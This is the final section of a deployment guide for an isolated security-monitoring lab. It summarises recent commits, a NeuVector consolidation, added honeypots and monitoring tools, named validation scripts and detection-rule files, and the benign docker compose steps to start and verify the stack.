### Recent Commits Summary

| Commit | Date | Category | Changes | Impact |
|--------|------|----------|---------|--------|
| **2edb9b1** | Dec 6 | NeuVector | Internal certificates update | Security certificate renewal |
| **4cf3680** | Dec 6 | Architecture | NeuVector: Multi-container → All-in-One | Simplified deployment, reduced overhead |
| **52a0aac** | Dec 5 | Testing | Added `test_suricata_rules.sh` script | Automated IDS rule validation |
| **c303c0c** | Dec 2 | Honeypots | Web app honeypot enhancements | Added Juice Shop + WebGoat containers |
| **cb0b3ef** | Nov 30 | Deployment | Enhanced honeypot scripts & configs | New attack simulation, verification scripts |
| **a1b2c3d** | Dec 7 | Monitoring | Netdata Config & Scripts | Fixed Netdata Prometheus scraping & added persistence |

### Major Refactoring: NeuVector Architecture

**Previous (Deprecated):**
- 3 separate containers (controller, manager, enforcer)
- Complex inter-container networking
- Individual certificate management
- Higher resource consumption

**Current (Production):**
- Single `neuvector-allinone:5.4.7` container
- Unified certificate management
- Simplified deployment and troubleshooting
- Reduced CPU/memory overhead (2 CPU, 4GB RAM)
- Same functionality and monitoring capabilities

### New Honeypot Integrations

**Added Web Application Honeypots:**
1. **OWASP Juice Shop** - Vulnerable web application
   - Multiple OWASP Top 10 vulnerabilities
   - Full e-commerce application
   - Training and testing environment

2. **WebGoat** - Web security learning platform
   - Interactive security lessons
   - Guided attack scenarios
   - Hands-on vulnerability practice

**Enhanced Traditional Honeypots:**
- Cowrie: SSH/Telnet recording and analytics
- Dionaea: Multi-protocol (FTP, SMB, MSSQL, MySQL, RDP)

### New Scripts for Testing & Validation

1. **test_suricata_rules.sh** - IDS rule validation
   - Automated rule testing
   - Alert generation verification
   - 50+ rule categories coverage

2. **simulate-honeypot-attacks.sh** - Attack simulation
   - SSH brute force
   - Protocol-specific payloads
   - Comprehensive logging

3. **verify-honeypots.sh** - Health checks
   - Container health validation
   - Port accessibility testing
   - Network connectivity checks

4. **verify-wazuh-honeypot-integration.sh** - SIEM verification
   - Wazuh alert reception
   - Event correlation
   - Dashboard validation

### Enhanced Monitoring Stack

**New Tools Added:**
- **Netdata** (10.10.30.93) - Real-time system metrics
- **Wireshark UI** (10.10.30.92) - Packet analysis interface
- **TCPDump Collector** (10.10.30.91) - Network packet capture
- **InfluxDB** (10.10.30.94) - Time-series metrics storage

**Enhanced Configurations:**
- Prometheus: 40+ scrape jobs (from ~15)
- Alert rules: 19KB of condition definitions
- Recording rules: Pre-computed metrics for dashboards
- Grafana: New network traffic dashboard

### Configuration Files Updated/Added

**Wazuh Detection Rules:**
- `honeypot_rules.xml` - Cowrie/Dionaea detection
- `webapp_rules.xml` - Web application attack detection
- `suricata_rules.xml` - IDS alert correlation
- `custom_detection_rules.xml` - Custom threat patterns

**Traefik Routing:**
- Honeypot TCP port routing (2222, 2223, 21, 445, etc.)
- New metrics endpoint (8082)
- Enhanced middleware access controls

**DNS Updates:**
- New honeypot DNS entries
- Web app honeypot records (juice-shop, webgoat)
- Updated Traefik routing entries

---

## 11. Deployment Status & Readiness

**Current Status:** ✅ Production Ready

**Verification Steps:**
```bash
# Start all services
cd infra
docker compose up -d

# Wait for services to be healthy (~2-3 minutes)
docker compose ps

# Run validation scripts
./scripts/verify-honeypots.sh
./scripts/verify-wazuh-honeypot-integration.sh
./scripts/test_suricata_rules.sh

# Access dashboards
# Wazuh: https://wazuh.cyberlab.local
# Grafana: https://grafana.cyberlab.local
# NeuVector: https://localhost:8443
```

**System Requirements:**
- **OS:** Linux (Ubuntu 20.04+) or macOS with Docker Desktop / WSL2 on Windows
- **Docker:** v24.0+
- **Docker Compose:** v2.20+
- **Memory:** 48+ GB recommended
- **CPU:** 8+ cores recommended
- **Disk:** 200+ GB for persistent volumes

**Network Requirements:**
- 5 isolated Docker bridge networks
- CIDR ranges: 10.10.0.0/16
- No external internet access required (self-contained)

---

**End of Guide** | For support, check logs in `infra/deploy-*.log` | Report issues with diagnostics bundle
